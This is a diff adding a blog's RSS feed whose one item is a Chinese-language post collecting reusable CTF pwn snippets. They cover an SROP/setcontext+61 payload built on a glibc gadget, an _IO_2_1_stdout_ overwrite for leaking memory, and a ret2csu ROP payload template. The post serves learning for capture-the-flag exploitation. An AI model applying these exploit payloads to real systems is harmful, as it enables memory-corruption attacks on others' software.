@@ -1,0 +1,44 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/">
+  <channel>
+    <title>Code on N0k&#39;s Den</title>
+    <link>http://localhost:1313/categories/code/</link>
+    <description>Recent content in Code on N0k&#39;s Den</description>
+    <generator>Hugo -- 0.147.8</generator>
+    <language>en</language>
+    <lastBuildDate>Thu, 20 May 2021 10:05:06 +0000</lastBuildDate>
+    <atom:link href="http://localhost:1313/categories/code/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>Pwn Snippet</title>
+      <link>http://localhost:1313/posts/pwn_snippet/</link>
+      <pubDate>Thu, 20 May 2021 10:05:06 +0000</pubDate>
+      <guid>http://localhost:1313/posts/pwn_snippet/</guid>
+      <description>&lt;h1 id=&#34;code-snippets-for-pwn&#34;&gt;Code Snippets for Pwn&lt;/h1&gt;
+&lt;p&gt;这里记录一些做CTF pwn题中大概也许可能会复用的代码片段.&lt;/p&gt;
+&lt;h3 id=&#34;magic_gadget--setcontext61-高版本glibc&#34;&gt;magic_gadget + setcontext+61 (高版本glibc)&lt;/h3&gt;
+&lt;p&gt;注1: &lt;code&gt;the_gadget&lt;/code&gt; 即&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;   0x154b20:	mov    rdx,QWORD PTR [rdi+0x8]
+   0x154b24:	mov    QWORD PTR [rsp],rax
+   0x154b28:	call   QWORD PTR [rdx+0x20]
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;SROP+伪造栈帧,按需布置伪栈帧和ROP链即可:&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;    frame = SigreturnFrame()
+    frame.rax = 0
+    frame.rsp = ROP_address
+    frame.rip = ret
+
+    frame_str = str(frame).ljust(frame_size,&amp;#34;\x00)
+    payload = p64(the_gadget) + p64(frame_addr) + p64(0)*4 + p64(setcontext+61) + frame_str[0x28:] 
+    payload += .....          #other stuff and ROP chain
+&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;_io_2_1_stdout_&#34;&gt;_IO_2_1_stdout_&lt;/h3&gt;
+&lt;p&gt;gdb查找语句:&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;p &amp;amp;_IO_2_1_stdout_
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;覆盖为:&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;payload = p64(0xfbad1800)+p64(0x0)*3+&amp;#39;\x00&amp;#39;
+&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;ret2csu&#34;&gt;ret2CSU&lt;/h3&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;payload = p6r + p64(0) + p64(1) + fuction_ptr\ 
+    + arg3 + arg2 + arg1 + mov_call\
+    + &amp;#34;\x00&amp;#34;*56 + return_address
+&lt;/code&gt;&lt;/pre&gt;</description>
+    </item>
+  </channel>
+</rss>
